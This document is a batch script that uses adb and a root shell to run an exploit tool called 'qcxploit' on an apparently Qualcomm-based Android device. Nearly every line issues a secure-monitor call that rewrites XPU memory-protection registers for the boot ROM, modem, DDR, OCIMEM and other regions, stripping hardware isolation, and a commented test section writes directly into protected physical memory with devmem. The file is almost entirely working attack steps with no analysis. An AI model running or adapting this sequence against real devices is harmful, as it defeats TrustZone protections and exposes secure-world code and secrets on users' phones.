adb shell su -c "mount -t debugfs debugfs /d/"
REM HWIO_SEC_CTRL_APU_XPU_CR_ADDR A:0x5f080 - reboot
REM HWIO_CRYPTO0_CRYPTO_BAM_XPU_CR_ADDR A:0x702080 - reboot
REM HWIO_BLSP1_BLSP_BAM_XPU_CR_ADDR A:0x7882080 - reboot
REM HWIO_XPU_CFG_RPM_CFG_XPU_CR_ADDR A:0x33080 - reboot
REM HWIO_DEHR_XPU_CR_ADDR A:0x4b0080 - reboot
REM HWIO_XPU_CFG_PRNG_CFG_XPU_CR_ADDR A:0x2f080 - reboot
REM HWIO_VENUS0_VENUS_XPU_CR_ADDR A:0x1df0080 - reboot

echo HWIO_BOOT_ROM_XPU_CR_ADDR A:0x1ff080 0x0000011F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 1ff080 11e 0" 
echo HWIO_BOOT_ROM_XPU_SCR_ADDR A:0x1ff000 0x0000013F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 1ff000 13e 0" 

echo HWIO_MPM2_XPU_CR_ADDR A:0x4a7080 0x0000011F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 4a7080 11e 0" 
echo HWIO_MPM2_XPU_SCR_ADDR A:0x4a7000 0x0000013F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 4a7000 13e 0"

echo HWIO_TLMM_XPU_CR_ADDR A:0x1300080 0x0000011F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 1300080 11e 0"
echo HWIO_TLMM_XPU_SCR_ADDR A:0x1300000 0x0000013F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 1300000 13e 0"

echo HWIO_XPU_CFG_SNOC_CFG_XPU_CR_ADDR A:0x2d080 0x0000011F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 2d080 11e 0"
echo HWIO_XPU_CFG_SNOC_CFG_XPU_SCR_ADDR A:0x2d000 0x0000013F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 2d000 13e 0"

echo HWIO_GCC_RPU_XPU_CR_ADDR A:0x1880080 0x0000011F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 1880080 11e 0" 
echo HWIO_GCC_RPU_XPU_SCR_ADDR A:0x1880000 0x0000013F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 1880000 13e 0"

echo HWIO_TCSR_REGS_XPU_CR_ADDR A:0x1936080 0x0000011F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 1936080 11e 0"
echo HWIO_TCSR_REGS_XPU_SCR_ADDR A:0x1936000 0x0000013F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 1936000 13e 0"

echo HWIO_XPU_CFG_SNOC_CFG_XPU_CR_ADDR A:0x2d080 0x0000011F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 2d080 11e 0" 
echo HWIO_XPU_CFG_SNOC_CFG_XPU_SCR_ADDR A:0x2d000 0x0000013F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 2d000 13e 0" 

echo HWIO_MSS_XPU_CR_ADDR A:0x4000080 0x0000011F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 4000080 11e 0"
echo HWIO_MSS_XPU_SCR_ADDR A:0x4000000 0x0000013F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 4000000 13e 0"

echo HWIO_RPM_APU_XPU_CR_ADDR A:0x287080 0x0000011F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 287080 11e 0" 
echo HWIO_RPM_APU_XPU_SCR_ADDR A:0x287000 0x0000013F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 287000 13e 0" 

echo HWIO_WCSS_A_XPU_XPU_CR_ADDR A:0xa21f080 0x0000011F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 a21f080 11e 0" 
echo HWIO_WCSS_A_XPU_XPU_SCR_ADDR A:0xa21f000 0x0000013F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 a21f000 13e 0"

echo HWIO_XPU_CFG_PCNOC_CFG_XPU_CR_ADDR A:0x2e080 0x0000011F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 2e080 11e 0"
echo HWIO_XPU_CFG_PCNOC_CFG_XPU_SCR_ADDR A:0x2e000 0x0000013F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 2e000 13e 0"

REM Here is the important stuff :

echo HWIO_OCIMEM_MPU_XPU_CR_ADDR A:0x53080 0x0000011F
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 53080 11e 0" 
echo #HWIO_OCIMEM_MPU_XPU_SCR_ADDR
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 53000 13e 0" 
echo #HWIO_BIMC_S_DDR0_XPU_CR_ADDR
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 44a080 19e 0"
echo #HWIO_BIMC_S_DDR0_XPU_SCR_ADDR
adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 44a000 13e 0" 

REM #HWIO_BIMC_S_DDR0_XPU_PRT2_START0_ADDR
REM adb shell su -c "/data/local/tmp/qcxploit svcreg 200020D 4 22 44a340 866f0000 0"

REM Test: 
REM ./busybox devmem 0x865ef918
REM ./busybox devmem 0x865ef918 32 0x865630fc
REM ./busybox devmem 0x865ef918 32 0x86572214
REM ./busybox devmem 0x8657221C 32 0xD2800000
REM ./qcxploit svcreg 200030F 4 0 53000 13e 0
